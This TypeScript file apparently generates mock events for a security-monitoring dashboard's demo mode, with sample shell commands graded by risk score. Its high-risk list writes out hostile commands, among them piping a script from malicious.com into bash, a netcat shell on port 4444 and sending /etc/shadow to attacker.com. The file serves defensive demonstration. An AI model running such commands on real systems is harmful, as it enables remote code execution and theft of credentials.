// Mock data generator for demo mode
export interface Event {
  time?: string;
  line?: string;
  score?: number;
  alert?: boolean;
  reason?: string;
}

const HIGH_RISK_COMMANDS = [
  {
    line: "nmap -sS 192.168.1.0/24",
    score: 0.95,
    alert: true,
    reason: "Network scanning tool used for reconnaissance. SYN scan is often used by attackers to identify open ports."
  },
  {
    line: "chmod 777 /etc/passwd",
    score: 0.90,
    alert: true,
    reason: "Granting full permissions to a critical system file is a severe privilege escalation attempt."
  },
  {
    line: "curl http://malicious.com/payload.sh | bash",
    score: 0.92,
    alert: true,
    reason: "Remote code execution: downloading and executing arbitrary shell script from untrusted source."
  },
  {
    line: "nc -l -p 4444 -e /bin/bash",
    score: 0.88,
    alert: true,
    reason: "Establishing a reverse shell using netcat, common technique for maintaining unauthorized access."
  },
  {
    line: "base64 -d /etc/shadow | curl -X POST http://attacker.com",
    score: 0.94,
    alert: true,
    reason: "Data exfiltration: decoding and transmitting sensitive password hash file to external server."
  }
];

const MEDIUM_RISK_COMMANDS = [
  {
    line: "wget https://example.com/script.sh",
    score: 0.45,
    alert: false,
    reason: "Downloading external script - potentially risky depending on source trustworthiness."
  },
  {
    line: "ssh root@192.168.1.100",
    score: 0.38,
    alert: false,
    reason: "SSH connection to remote host - legitimate but requires monitoring for unauthorized access."
  },
  {
    line: "docker exec -it container /bin/sh",
    score: 0.42,
    alert: false,
    reason: "Container shell access - normal admin operation but can be used for lateral movement."
  }
];

const LOW_RISK_COMMANDS = [
  {
    line: "ls -la /home",
    score: 0.05,
    alert: false,
    reason: "Normal file listing command for viewing directory contents."
  },
  {
    line: "ps aux",
    score: 0.08,
    alert: false,
    reason: "Standard command for displaying running processes."
  },
  {
    line: "cat /var/log/app.log",
    score: 0.10,
    alert: false,
    reason: "Reading application logs - normal troubleshooting activity."
  },
  {
    line: "df -h",
    score: 0.06,
    alert: false,
    reason: "Checking disk space usage - routine system monitoring."
  },
  {
    line: "kubectl get pods",
    score: 0.12,
    alert: false,
    reason: "Kubernetes resource inspection - standard administrative operation."
  }
];

let eventCounter = 0;
const generatedEvents: Event[] = [];

function getRandomCommand() {
  const rand = Math.random();
  if (rand < 0.2) {
    // 20% high risk
    return HIGH_RISK_COMMANDS[Math.floor(Math.random() * HIGH_RISK_COMMANDS.length)];
  } else if (rand < 0.4) {
    // 20% medium risk
    return MEDIUM_RISK_COMMANDS[Math.floor(Math.random() * MEDIUM_RISK_COMMANDS.length)];
  } else {
    // 60% low risk
    return LOW_RISK_COMMANDS[Math.floor(Math.random() * LOW_RISK_COMMANDS.length)];
  }
}

export function generateMockEvent(): Event {
  const cmd = getRandomCommand();
  const event: Event = {
    ...cmd,
    time: new Date(Date.now() - eventCounter * 10000).toISOString()
  };
  eventCounter++;
  return event;
}

export function initializeMockData(): Event[] {
  if (generatedEvents.length === 0) {
    // Generate initial dataset
    for (let i = 0; i < 15; i++) {
      generatedEvents.push(generateMockEvent());
    }
  }
  return generatedEvents;
}

export function addNewMockEvent(): Event {
  const newEvent = generateMockEvent();
  generatedEvents.unshift(newEvent);
  
  // Keep only last 100 events
  if (generatedEvents.length > 100) {
    generatedEvents.pop();
  }
  
  return newEvent;
}

export function getMockEvents(): Event[] {
  return [...generatedEvents];
}

export function generateBulkTestData(count: number = 5): Event[] {
  const newEvents: Event[] = [];
  for (let i = 0; i < count; i++) {
    newEvents.push(generateMockEvent());
  }
  
  // Add to the beginning of the list
  generatedEvents.unshift(...newEvents);
  
  // Keep only last 100 events
  if (generatedEvents.length > 100) {
    generatedEvents.splice(100);
  }
  
  return newEvents;
}
